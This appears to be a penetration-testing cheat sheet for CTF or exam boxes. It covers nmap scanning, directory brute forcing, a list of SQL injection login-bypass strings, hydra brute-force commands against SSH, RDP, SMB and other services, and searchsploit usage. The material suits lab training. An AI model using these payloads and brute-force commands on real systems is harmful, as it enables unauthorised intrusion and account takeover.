My Initial way of approaching Exam/ Vuln CTF Boxes:

netdiscover -i eth0 — This will help me to get the machines available on our network. [ eth0 may differ if VPN network I will be tun0 ]
Once I get the IP’s I will run my Nmap on all those IP’s.
nmap -p- 10.10.10.10 [ Any IP ]

Once I ran the above command I will get all the opened port on that target and then with that open port, I will run another nmap, for example, if port 443,80,53,135,8080,8888 are opened then my nmap command will be.

4. nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10

This will find out the OS version, service version, and ran default nmap script and store the output. Storing output is very important, you may need to refer it many times.

5. While nmap is running I will open all the IPs on browser and will see whether any web service is running on not, if Yes then I will run gobuster or dirb.

gobuster -e -u http://10.10.10.10 -w wordlsit.txt

dirb http://10.10.10.10 wordlist.txt

6. If I find any login page I will try SQLi manually

admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—


7. Brute Forcing services !! and making custom wordlists is always an added advantage but make sure the service won’t be down OR lock you out from trying again.

Some of the default password list:

http://www.phenoelit.org/dpl/dpl.html
https://datarecovery.com/rd/default-passwords/
https://github.com/Dormidera/WordList-Compendium
Making custom wordlist from website keywords:

cewl example.com -m 5 -w words.txt
where cewl is the tool, example.com is the site, -m is to specify the minimum length of the word , -w is to specify the output file

Some of the service brute force with hydra:

hydra -l root -P passwords.txt [-t 32] <IP> ftp
hydra -L usernames.txt -P pass.txt <IP> mysql
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
hydra -P common-snmp-community-strings.txt target.com snmp
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
hydra -l root -P passwords.txt <IP> ssh
Searchsploit useful commands:

searchsploit “Linux Kernel”
searchsploit -m 7618 — Paste the exploit in the current directory
searchsploit -p 7618[.c] — Show complete path
searchsploit — nmap file.xml — Search vulns inside a Nmap XML result
